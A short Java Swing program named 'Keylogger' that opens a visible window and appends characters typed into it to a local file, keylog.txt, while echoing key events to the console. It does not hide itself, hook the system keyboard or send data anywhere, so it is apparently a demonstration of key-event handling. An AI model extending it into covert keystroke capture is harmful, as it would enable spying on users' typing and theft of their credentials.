import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class Keylogger extends JFrame implements KeyListener {
    
    private static final long serialVersionUID = 1L;
    private BufferedWriter writer;
    private JLabel label; 

    public Keylogger() {
        try {
            writer = new BufferedWriter(new FileWriter("keylog.txt", true));
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        
        this.setTitle("Keylogger");
        this.setSize(400, 200);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        
        JPanel panel = new JPanel();
        this.add(panel);

        label = new JLabel("Type something here...");
        panel.add(label);

        panel.addKeyListener(this);
        panel.setFocusable(true); 
        panel.requestFocusInWindow(); 

        this.setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        logKey(e);
        System.out.println("Key Typed: " + e.getKeyChar()); 
    }

    @Override
    public void keyPressed(KeyEvent e) {
        // Optionally log key presses
        System.out.println("Key Pressed: " + e.getKeyCode()); 
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Optionally log key releases
        System.out.println("Key Released: " + e.getKeyCode()); 
    }

    private void logKey(KeyEvent e) {
        try {
            writer.write(e.getKeyChar());
            writer.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void dispose() {
        super.dispose();
        try {
            writer.close(); 
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new Keylogger();
    }
}
